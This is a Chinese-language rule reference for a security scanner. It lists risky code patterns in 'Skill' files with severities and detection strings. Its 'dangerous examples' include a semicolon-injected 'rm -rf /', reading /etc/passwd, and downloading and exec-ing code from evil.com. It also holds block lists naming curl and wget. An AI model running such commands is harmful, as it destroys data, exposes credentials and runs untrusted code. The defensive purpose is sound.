# 安全风险模式定义

## 目录
- [概述](#概述)
- [本地命令执行](#本地命令执行)
- [命令注入](#命令注入)
- [敏感路径访问](#敏感路径访问)
- [外部下载与执行](#外部下载与执行)
- [动态导入](#动态导入)
- [硬编码凭证](#硬编码凭证)
- [路径遍历](#路径遍历)
- [不安全的反序列化](#不安全的反序列化)

## 概述
本文档定义了 Skill 文件中可能触发安全扫描的高风险模式，包括风险描述、严重程度和检测方法。

## 本地命令执行

### 描述
直接执行本地系统命令，可能导致命令注入攻击或系统滥用。

### 严重程度
High

### 检测模式
```python
# 函数调用模式
exec_shell(
os.system(
subprocess.call(
subprocess.run(
subprocess.Popen(
eval(
exec(
os.exec
```

### 风险场景
- 使用用户输入作为命令参数
- 未验证的命令执行
- 直接拼接命令字符串

### 示例
```python
# 危险示例
os.system(user_input)  # 用户输入可能包含恶意命令

subprocess.run(f"rm -rf {user_dir}")  # 可能删除任意目录
```

## 命令注入

### 描述
通过特殊字符注入额外的命令，在原有命令基础上执行恶意操作。

### 严重程度
Critical

### 检测模式
```
;       # 命令分隔符
&       # 后台执行
|       # 管道
`       # 命令替换
$()     # 命令替换
&&      # 条件执行
||      # 条件执行
```

### 风险场景
- 命令字符串拼接
- 未转义的特殊字符
- Shell 命令直接执行

### 示例
```python
# 危险示例
os.system(f"cat {filename}; rm -rf /")  # 分号注入

subprocess.run(f"ls {path} | cat")  # 管道注入
```

## 敏感路径访问

### 描述
访问系统敏感文件或目录，可能导致信息泄露或系统破坏。

### 严重程度
High

### 检测模式
```
/etc/passwd      # 用户密码文件
/etc/shadow      # 加密密码文件
/etc/hosts       # 主机文件
/root/           # 超级用户目录
/var/            # 系统变量目录
/home/username/  # 其他用户目录
../              # 父目录遍历
```

### 风险场景
- 直接访问系统文件
- 路径遍历攻击
- 未授权的目录访问

### 示例
```python
# 危险示例
with open('/etc/passwd', 'r') as f:  # 读取系统文件
    print(f.read())

path = '../../etc/passwd'  # 路径遍历
```

## 外部下载与执行

### 描述
从外部网络下载资源并执行，可能引入恶意代码。

### 严重程度
Medium

### 检测模式
```python
urllib.request.(
urllib.parse.(
requests.get(
requests.post(
wget
curl
```

### 风险场景
- 从不可信来源下载
- 下载后直接执行
- 未验证下载内容

### 示例
```python
# 危险示例
import urllib.request
urllib.request.urlopen('http://evil.com/malware.py')  # 下载恶意文件

import requests
code = requests.get('http://example.com/script.py').text
exec(code)  # 执行下载的代码
```

## 动态导入

### 描述
动态加载和执行代码模块，可能导致代码注入攻击。

### 严重程度
Medium

### 检测模式
```python
__import__(
importlib.import_module(
importlib.reload(
exec("import
```

### 风险场景
- 动态加载用户提供的模块
- 执行动态生成的代码
- 未验证的模块来源

### 示例
```python
# 危险示例
module = __import__(user_module_name)  # 动态导入

exec(f"import {user_input}")  # 执行动态导入
```

## 硬编码凭证

### 描述
在代码中硬编码敏感凭证信息，可能导致凭证泄露。

### 严重程度
Medium

### 检测模式
```
password: "xxx"
passwd = "xxx"
secret = "xxx"
key = "xxx"
token = "xxx"
api_key = "xxx"
```

### 风险场景
- 密码硬编码在代码中
- API Token 暴露
- 配置文件中的敏感信息

### 示例
```python
# 危险示例
API_KEY = "sk-1234567890abcdef"  # 硬编码 API 密钥

password = "admin123"  # 硬编码密码
```

## 路径遍历

### 描述
通过路径遍历访问预期外的文件，可能导致信息泄露。

### 严重程度
High

### 检测模式
```
../        # 父目录
..\\       # Windows 父目录
open(../   # 打开父目录文件
Path(../   # 路径对象
```

### 风险场景
- 未验证的文件路径
- 用户提供的路径参数
- 相对路径遍历

### 示例
```python
# 危险示例
filename = user_input  # 用户输入可能包含 ../
with open(f'/home/user/{filename}') as f:  # 路径遍历
    content = f.read()
```

## 不安全的反序列化

### 描述
使用不安全的反序列化方法，可能导致远程代码执行。

### 严重程度
High

### 检测模式
```python
pickle.loads(
pickle.load(
shelve.open(
yaml.unsafe_load(
```

### 风险场景
- 反序列化不可信数据
- 使用危险的反序列化库
- 未验证的反序列化输入

### 示例
```python
# 危险示例
import pickle
data = pickle.loads(user_data)  # 反序列化用户数据，可能包含恶意代码

import yaml
obj = yaml.unsafe_load(yaml_string)  # 不安全的 YAML 加载
```

## 附录：风险等级定义

- **Critical**: 严重安全漏洞，必须立即修复
- **High**: 高风险问题，建议优先处理
- **Medium**: 中等风险问题，应该修复
- **Low**: 低风险问题，建议修复
